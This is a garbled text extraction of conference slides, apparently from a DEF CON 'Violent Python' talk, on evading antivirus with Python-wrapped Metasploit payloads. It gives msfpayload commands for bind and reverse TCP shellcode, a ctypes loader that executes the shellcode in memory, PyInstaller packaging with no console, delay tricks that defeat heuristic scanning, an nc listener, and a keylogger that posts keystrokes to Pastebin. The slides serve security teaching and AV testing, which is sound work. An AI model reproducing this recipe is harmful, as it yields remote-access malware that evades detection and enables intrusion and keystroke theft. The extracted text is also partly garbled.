Violent(Python(
!
DEF(CON(23!
Fri.,(Aug(8,(2015,(9?1!
Sam(Bowne(
City(College(San(Francisco!
Slides(and(projects(at(samsclass.info(
Bio$
CNIT$124$
Advanced$Ethical$Hacking$
Violent$Python$
•  Good$coding$principles$
– ExcepBon$handling$
– Modular$design$
– OpBmizaBon$
– CommenBng$
– Flow$charts$
•  FORGET$THEM$ALL$
Violent$Python$
•  We$are$hackers$
•  We$are$here$to$BREAK$STUFF$
•  It$should$be$fast$and$easy$for$a$complete$
novice$to$hack$together$a$simple$script$to$do$
something$fun!$
Projects$
AnBvirus$
$
Ungh!$$Good$God$y'all...$
$
What$is$it$GOOD$For?$
Mikko$Hypponen$Video$
Metasploit$Payloads$
Metasploit$
•  Hundreds$of$payloads$
•  The$simplest$one:$bind_tcp$
•  Listens$on$a$TCP$port$for$commands$
Simple$Reverse$Shell$
•  One$command$to$produce$very$simple$
Windows$EXE$malware$
AnBvirus$Catches$It$
Norton$v.$Shell.exe$
Norton$IdenBﬁes$the$Metasploit$
Packer$
VirusTotal:$37/49$DetecBons$
How$to$
Become$
007$
Python$v.$AV$
Round$1$
shell_bind_tcp$
Export$Metasploit$Payloads$to$C$
Use$Ctypes$Python$Library$
Compile$it$on$Windows$
•  Install$these$$things,$in$order$
– Python$2.7$
– PyWin32$
– pipbWin$
– PyInstaller$
•  This$creates$an$EXE$ﬁle$that$listens$on$a$TCP$
port$
DEMO$
•  On$Kali$
msfpayload windows/shell_bind_tcp C > foo
nano foo
•  Change$top$to$
from ctypes import *
shellcode = (
•  Change$bocom$to$
);
memorywithshell = create_string_buffer(shellcode, 
len(shellcode))
shell = cast(memorywithshell, 
CFUNCTYPE(c_void_p))
shell()
DEMO$
•  On$Windows,$in$pipbWin:$
venv -c -i pyi-env-name
pyinstaller --onefile --noconsole foo
VirusTotal:$1/50$DetecBon$
Norton$Support$
•  I$Tweeted$about$this,$and$@NortonSupport$
replied$
•  VirusTotal$is$not$a$fair$test,$because$real$
installed$Norton$uses$HeurisBc$Scanning$
•  @NortonSupport$gave$me$a$link$for$a$30bday$
trial$version$:)$
Norton$Wins!$
Kaspersky$Wins!$
•  Avast!$doesn't$detect$it$
•  Kaspersky$detects$it$as$
HEUR:Trojan.Win32.Generic$
Python$v.$AV$
Round$2$
shell_bind_tcp$
with$a$delay$
DEMO$
•  On$Kali$
cp foo foo2
nano foo2
x=raw_input("Press Enter to continue")
•  On$Windows,$in$pipbWin:$
venv -c -i pyi-env-name
pyinstaller --onefile foo2
Norton,$Avast,$&$MSE$Lose!$
Kaspersky$Wins!$
Python$v.$AV$
Round$3$
shell_bind_tcp$
in$two$stages$
no$delay$
Other$AV$
•  Tested$on$Mar$24,$2014$with$a$twobstage$
reverse$shell$and$no$Bme$delay$
•  Al$these$failed$
– Norton$
– Nod32$
– Avast!$
– 360$Internet$Security$
– McAfee$
– Kaspersky$
Remember$Mikko?$
FbSecure$Wins!$
AV$Challenge$
•  Posted$April$3,$2014$
•  No$reply$from$AV$vendors,$but$Norton$
improved$its$detecBon$aier$that$
– Now$a$delay$is$required$
Python$v.$AV$
Round$4$
shell_bind_tcp$
with$a$delay$
INSTRUCTIONS$
•  On$Kali$
msfpayload windows/shell_reverse_tcp 
LHOST=192.168.119.252 C > rev
nano rev
•  Change$top$to$
x=raw_input("Press Enter to continue")
from ctypes import *
shellcode = (
•  Change$bocom$to$
);
memorywithshell = create_string_buffer(shellcode, 
len(shellcode))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
INSTRUCTIONS$
•  On$Windows,$in$pipbWin:$
venv -c -i pyi-env-name
pyinstaller --onefile rev
•  On$Kali$
nc –lp 4444
Norton$Loses$
Kaspersky$Wins$
Advanced$Malware$ProtecBon$
ty$@ChrisAbdalla_1$from$HP$ESP$TippingPoint$
•  A$friend$in$the$ﬁnancial$industry$tested$
Evil.exe$on$a$system$protected$by$FireEye$
•  FireEye$gives$no$alerts$and$lets$it$post$
keystrokes$right$to$Pastebin$
Python$Keylogger$
Google$
"Python$
Keylogger"$
•  I$used$this$
one$from$4$
years$ago$
Post$Keystrokes$to$Pastebin$
Problem$
•  Pastebin$busted$me$for$making$too$many$
pastes$in$a$24bhour$period$
•  So$I$wrote$my$own$Pastebin$imitaBon$
Kaspersky$&$Avast!$LOSE$
Norton$WINS!$
But$just$add$a$delay...$
FbSecure$LOSES!$
PRODUCT$ANNOUNCEMENT!$
UltrabAdvanced$APT$Tool$
samsclass.info/evil.exe$
UNSTOPPABLE$
•  None$of$these$products$stop$it$
– Norton$
– McAfee$
– Kaspersky$
– Nod32$
– FbSecure$
– Avast!$
– Microsoi$Security$EssenBals$